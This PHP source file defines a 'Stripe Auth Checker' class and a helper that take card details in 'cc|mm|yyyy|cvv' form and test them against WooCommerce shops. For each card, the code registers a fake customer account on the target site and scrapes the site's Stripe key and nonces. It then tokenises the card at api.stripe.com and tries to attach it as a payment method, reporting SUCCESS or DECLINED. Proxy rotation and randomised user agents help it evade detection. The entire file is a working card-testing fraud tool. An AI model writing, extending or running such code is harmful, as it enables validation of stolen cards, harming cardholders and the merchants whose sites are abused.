<?php
/**
 * Stripe Auth Checker - Pure PHP Implementation
 * No Python dependencies required
 */

class StripeAuthChecker {
    private $domain;
    private $proxy;
    private $session;
    private $cookies = [];
    private $userAgent;
    private $sessionStartTime;
    private $sessionPages = 0;
    private $accountEmail;
    private $registerNonce;
    private $paymentNonce;
    private $createSetupIntentNonce;
    private $createAndConfirmSetupIntentNonce;
    private $stripePublishableKey;
    private $stripeAccountId;
    private $pmId;
    private $guid;
    private $muid;
    private $sid;
    private $stripePattern;
    
    public function __construct($domain, $proxy = null) {
        $this->domain = $domain;
        if (!preg_match('#^https?://#', $this->domain)) {
            $this->domain = 'https://' . $this->domain;
        }
        $this->domain = rtrim($this->domain, '/');
        
        $this->proxy = $proxy;
        $this->sessionStartTime = date('Y-m-d H:i:s');
        
        // Random user agents
        $userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        ];
        $this->userAgent = $userAgents[array_rand($userAgents)];
    }
    
    private function request($url, $method = 'GET', $data = null, $headers = []) {
        $ch = curl_init();
        
        $defaultHeaders = [
            'User-Agent: ' . $this->userAgent,
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language: en-US,en;q=0.5',
            'Accept-Encoding: gzip, deflate, br',
            'Connection: keep-alive',
        ];
        
        $allHeaders = array_merge($defaultHeaders, $headers);
        
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $allHeaders);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_ENCODING, '');
        
        // Handle cookies
        if (!empty($this->cookies)) {
            $cookieStr = '';
            foreach ($this->cookies as $name => $value) {
                $cookieStr .= "$name=$value; ";
            }
            curl_setopt($ch, CURLOPT_COOKIE, rtrim($cookieStr, '; '));
        }
        
        curl_setopt($ch, CURLOPT_HEADER, true);
        
        if ($method === 'POST') {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        }
        
        // Proxy support
        if ($this->proxy) {
            curl_setopt($ch, CURLOPT_PROXY, $this->formatProxy($this->proxy));
        }
        
        $response = curl_exec($ch);
        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        curl_close($ch);
        
        $headerText = substr($response, 0, $headerSize);
        $body = substr($response, $headerSize);
        
        // Extract cookies
        preg_match_all('/Set-Cookie: ([^=]+)=([^;]+)/i', $headerText, $matches);
        if (!empty($matches[1])) {
            for ($i = 0; $i < count($matches[1]); $i++) {
                $this->cookies[$matches[1][$i]] = $matches[2][$i];
            }
        }
        
        return ['status' => $statusCode, 'body' => $body, 'headers' => $headerText];
    }
    
    private function formatProxy($proxy) {
        $parts = explode(':', $proxy);
        if (count($parts) == 4) {
            // ip:port:user:pass -> user:pass@ip:port
            return $parts[2] . ':' . $parts[3] . '@' . $parts[0] . ':' . $parts[1];
        }
        return $proxy;
    }
    
    private function generateEmail() {
        $domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'];
        $username = substr(md5(uniqid()), 0, 10);
        return $username . '@' . $domains[array_rand($domains)];
    }
    
    private function generatePassword() {
        return substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$'), 0, 12);
    }
    
    private function extractField($html, $pattern) {
        if (preg_match($pattern, $html, $matches)) {
            return $matches[1];
        }
        return null;
    }
    
    public function run($cc, $mm, $yyyy, $cvv) {
        try {
            // Step 1: Visit account page
            $response = $this->request($this->domain . '/my-account/');
            if ($response['status'] != 200) {
                return ['success' => false, 'message' => 'Failed to load account page', 'status' => 'ERROR'];
            }
            
            $html = $response['body'];
            $this->sessionPages++;
            
            // Step 2: Extract registration nonce
            $this->registerNonce = $this->extractField($html, '/name=["\']woocommerce-register-nonce["\']\s+value=["\']([^"\']+)["\']/');
            if (!$this->registerNonce) {
                return ['success' => false, 'message' => 'Registration nonce not found', 'status' => 'ERROR'];
            }
            
            // Step 3: Create account
            $this->accountEmail = $this->generateEmail();
            $password = $this->generatePassword();
            
            $postData = http_build_query([
                'email' => $this->accountEmail,
                'password' => $password,
                'email_2' => '',
                'wc_order_attribution_source_type' => 'typein',
                'wc_order_attribution_referrer' => '(none)',
                'wc_order_attribution_utm_campaign' => '(none)',
                'wc_order_attribution_utm_source' => '(direct)',
                'wc_order_attribution_utm_medium' => '(none)',
                'wc_order_attribution_session_entry' => $this->domain . '/my-account/',
                'wc_order_attribution_session_start_time' => str_replace(' ', '+', $this->sessionStartTime),
                'wc_order_attribution_session_pages' => $this->sessionPages,
                'wc_order_attribution_session_count' => '1',
                'wc_order_attribution_user_agent' => $this->userAgent,
                'woocommerce-register-nonce' => $this->registerNonce,
                '_wp_http_referer' => '/my-account/',
                'register' => 'Register',
            ]);
            
            $headers = [
                'Content-Type: application/x-www-form-urlencoded',
                'Origin: ' . $this->domain,
                'Referer: ' . $this->domain . '/my-account/',
            ];
            
            $response = $this->request($this->domain . '/my-account/?action=register', 'POST', $postData, $headers);
            $this->sessionPages++;
            
            // Step 4: Load payment method page
            $response = $this->request($this->domain . '/my-account/add-payment-method/');
            if ($response['status'] != 200) {
                return ['success' => false, 'message' => 'Failed to load payment method page', 'status' => 'ERROR'];
            }
            
            $html = $response['body'];
            $this->sessionPages++;
            
            // Extract payment nonce
            $this->paymentNonce = $this->extractField($html, '/name=["\']woocommerce-add-payment-method-nonce["\']\s+value=["\']([^"\']+)["\']/');
            
            // Extract Stripe configuration
            $this->stripePublishableKey = $this->extractField($html, '/"publishableKey"\s*:\s*"([^"]+)"/');
            if (!$this->stripePublishableKey) {
                $this->stripePublishableKey = $this->extractField($html, '/"key"\s*:\s*"([^"]+)"/');
            }
            
            $this->stripeAccountId = $this->extractField($html, '/"accountId"\s*:\s*"([^"]+)"/');
            $this->createSetupIntentNonce = $this->extractField($html, '/"createSetupIntentNonce"\s*:\s*"([^"]+)"/');
            $this->createAndConfirmSetupIntentNonce = $this->extractField($html, '/"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"/');
            
            if (!$this->stripePublishableKey) {
                return ['success' => false, 'message' => 'Stripe key not found', 'status' => 'ERROR'];
            }
            
            // Determine pattern
            if ($this->createAndConfirmSetupIntentNonce) {
                $this->stripePattern = 'pattern2';
            } else {
                $this->stripePattern = 'pattern1';
            }
            
            // Step 5: Generate Stripe IDs
            $this->guid = $this->generateGuid();
            $this->muid = $this->generateUuid();
            $this->sid = $this->generateUuid();
            
            // Step 6: Tokenize card with Stripe
            $yy = substr($yyyy, -2);
            $ccFormatted = implode(' ', str_split($cc, 4));
            
            $stripeData = http_build_query([
                'billing_details[name]' => ' ',
                'billing_details[email]' => $this->accountEmail,
                'billing_details[address][country]' => 'US',
                'billing_details[address][postal_code]' => '10001',
                'type' => 'card',
                'card[number]' => $ccFormatted,
                'card[cvc]' => $cvv,
                'card[exp_year]' => $yy,
                'card[exp_month]' => str_pad($mm, 2, '0', STR_PAD_LEFT),
                'allow_redisplay' => 'unspecified',
                'guid' => $this->guid,
                'muid' => $this->muid,
                'sid' => $this->sid,
                'key' => $this->stripePublishableKey,
            ]);
            
            if ($this->stripeAccountId) {
                $stripeData .= '&_stripe_account=' . urlencode($this->stripeAccountId);
            }
            
            $stripeHeaders = [
                'Accept: application/json',
                'Content-Type: application/x-www-form-urlencoded',
                'Origin: https://js.stripe.com',
                'Referer: https://js.stripe.com/',
            ];
            
            $response = $this->request('https://api.stripe.com/v1/payment_methods', 'POST', $stripeData, $stripeHeaders);
            
            if ($response['status'] != 200) {
                $error = json_decode($response['body'], true);
                $errorMsg = $error['error']['message'] ?? 'Tokenization failed';
                return ['success' => false, 'message' => $errorMsg, 'status' => 'DECLINED'];
            }
            
            $stripeResponse = json_decode($response['body'], true);
            $this->pmId = $stripeResponse['id'] ?? null;
            
            if (!$this->pmId) {
                return ['success' => false, 'message' => 'Failed to get payment method ID', 'status' => 'ERROR'];
            }
            
            // Step 7: Create setup intent
            if ($this->stripePattern === 'pattern2') {
                $setupData = http_build_query([
                    'action' => 'wc_stripe_create_and_confirm_setup_intent',
                    'wc-stripe-payment-method' => $this->pmId,
                    'wc-stripe-payment-type' => 'card',
                    '_ajax_nonce' => $this->createAndConfirmSetupIntentNonce,
                ]);
            } else {
                $boundary = '----geckoformboundary' . bin2hex(random_bytes(16));
                $setupData = "--$boundary\r\n";
                $setupData .= "Content-Disposition: form-data; name=\"action\"\r\n\r\n";
                $setupData .= "create_setup_intent\r\n";
                $setupData .= "--$boundary\r\n";
                $setupData .= "Content-Disposition: form-data; name=\"wcpay-payment-method\"\r\n\r\n";
                $setupData .= $this->pmId . "\r\n";
                $setupData .= "--$boundary\r\n";
                $setupData .= "Content-Disposition: form-data; name=\"_ajax_nonce\"\r\n\r\n";
                $setupData .= $this->createSetupIntentNonce . "\r\n";
                $setupData .= "--$boundary--\r\n";
            }
            
            $setupHeaders = $this->stripePattern === 'pattern2' ? [
                'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With: XMLHttpRequest',
                'Origin: ' . $this->domain,
                'Referer: ' . $this->domain . '/my-account/add-payment-method/',
            ] : [
                'Content-Type: multipart/form-data; boundary=' . $boundary,
                'Origin: ' . $this->domain,
                'Referer: ' . $this->domain . '/my-account/add-payment-method/',
            ];
            
            $response = $this->request($this->domain . '/wp-admin/admin-ajax.php', 'POST', $setupData, $setupHeaders);
            
            $result = json_decode($response['body'], true);
            
            if ($result && isset($result['success']) && $result['success'] === true) {
                $message = 'Payment method added successfully';
                if (isset($result['data']['status'])) {
                    if ($result['data']['status'] === 'succeeded') {
                        $message = 'Payment method added successfully';
                    }
                }
                return [
                    'success' => true,
                    'status' => 'SUCCESS',
                    'message' => $message,
                    'account_email' => $this->accountEmail,
                    'pm_id' => $this->pmId,
                ];
            } else {
                $errorMsg = 'Card declined';
                if ($result && isset($result['data']['error']['message'])) {
                    $errorMsg = $result['data']['error']['message'];
                } elseif ($result && isset($result['data']['message'])) {
                    $errorMsg = $result['data']['message'];
                } elseif ($result && isset($result['message'])) {
                    $errorMsg = $result['message'];
                }
                
                return [
                    'success' => false,
                    'status' => 'DECLINED',
                    'message' => $errorMsg,
                    'account_email' => $this->accountEmail,
                    'pm_id' => $this->pmId,
                ];
            }
            
        } catch (Exception $e) {
            return [
                'success' => false,
                'status' => 'ERROR',
                'message' => $e->getMessage(),
                'account_email' => null,
                'pm_id' => null,
            ];
        }
    }
    
    private function generateUuid() {
        return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
            mt_rand(0, 0xffff), mt_rand(0, 0xffff),
            mt_rand(0, 0xffff),
            mt_rand(0, 0x0fff) | 0x4000,
            mt_rand(0, 0x3fff) | 0x8000,
            mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
        );
    }
    
    private function generateGuid() {
        return $this->generateUuid() . substr(str_replace('-', '', $this->generateUuid()), 0, 16);
    }
}

// Helper function for external use
function checkStripeAuth($domain, $card, $proxy = null) {
    // Parse card format: cc|mm|yyyy|cvv
    $parts = explode('|', $card);
    if (count($parts) !== 4) {
        return ['success' => false, 'message' => 'Invalid card format', 'status' => 'ERROR'];
    }
    
    list($cc, $mm, $yyyy, $cvv) = $parts;
    
    $checker = new StripeAuthChecker($domain, $proxy);
    return $checker->run($cc, $mm, $yyyy, $cvv);
}
?>
